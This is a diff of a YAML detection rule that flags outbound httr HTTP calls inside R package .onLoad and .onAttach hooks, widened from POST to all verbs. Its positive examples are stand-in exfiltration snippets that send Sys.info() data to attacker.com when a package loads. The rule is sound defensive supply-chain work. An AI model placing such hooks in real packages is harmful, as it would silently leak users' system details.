@@ -1,24 +1,29 @@
-name: onload_calls_httr_POST_rule
-version: "0.1.0"
+name: onload_calls_httr_rule
+version: "0.2.0"
 type: warning
 attck:
   - T1041
   - T1195.002
 message: >-
-  A POST request inside .onLoad or .onAttach sends an outbound HTTP request
-  automatically when a package is loaded. Matches httr::POST(), unqualified
-  POST() (e.g. after importFrom(httr, POST)), and httr::VERB().
+  An httr HTTP call inside .onLoad or .onAttach sends an outbound request
+  automatically when a package is loaded. Matches all httr verb functions
+  (GET, POST, PUT, PATCH, DELETE, HEAD) and httr::VERB(), both qualified
+  (httr::) and unqualified.
 description: >-
-  Flag POST() calls (qualified as httr::POST() or unqualified) and httr::VERB()
-  calls inside .onLoad or .onAttach. Matches assignments using <-, =, or ->
-  so that all syntactically valid definition forms are covered.
+  Flag httr HTTP verb calls inside .onLoad or .onAttach. Covers all methods
+  because any outbound request in a hook can exfiltrate data or stage a
+  payload. Matches assignments using <-, =, or -> so that all syntactically
+  valid definition forms are covered.
 xpath: >-
   (//expr | //expr_or_assign_or_help)[
     (
       (LEFT_ASSIGN or EQ_ASSIGN)
       and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
       and expr[FUNCTION][
-        .//SYMBOL_FUNCTION_CALL[text() = 'POST']
+        .//SYMBOL_FUNCTION_CALL[
+          text() = 'GET' or text() = 'POST' or text() = 'PUT' or
+          text() = 'PATCH' or text() = 'DELETE' or text() = 'HEAD'
+        ]
         or .//expr[
           SYMBOL_PACKAGE[text() = 'httr']
           and NS_GET
@@ -31,7 +36,10 @@ xpath: >-
       RIGHT_ASSIGN
       and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
       and expr[1][
-        .//SYMBOL_FUNCTION_CALL[text() = 'POST']
+        .//SYMBOL_FUNCTION_CALL[
+          text() = 'GET' or text() = 'POST' or text() = 'PUT' or
+          text() = 'PATCH' or text() = 'DELETE' or text() = 'HEAD'
+        ]
         or .//expr[
           SYMBOL_PACKAGE[text() = 'httr']
           and NS_GET
@@ -47,7 +55,7 @@ example_positive:
     }
   - |
     .onAttach <- function(libname, pkgname) {
-      httr::POST("https://attacker.com/collect", body = list(pkg = pkgname))
+      httr::GET("https://attacker.com/ping", query = list(host = Sys.info()))
     }
   - |
     .onLoad <- function(libname, pkgname) {
@@ -55,11 +63,11 @@ example_positive:
     }
   - |
     .onLoad = function(libname, pkgname) {
-      httr::POST("https://attacker.com/collect", body = list(user = Sys.info()))
+      httr::PUT("https://attacker.com/collect", body = list(user = Sys.info()))
     }
   - |
     (function(libname, pkgname) {
-      httr::POST("https://attacker.com/collect", body = list(host = Sys.info()))
+      httr::VERB("POST", "https://attacker.com/collect", body = list(host = Sys.info()))
     }) -> .onAttach
 example_negative:
   - |
@@ -68,5 +76,5 @@ example_negative:
     }
   - |
     .onUnload <- function(libpath) {
-      httr::POST("https://example.com/unloaded")
+      httr::GET("https://example.com/unloaded")
     }
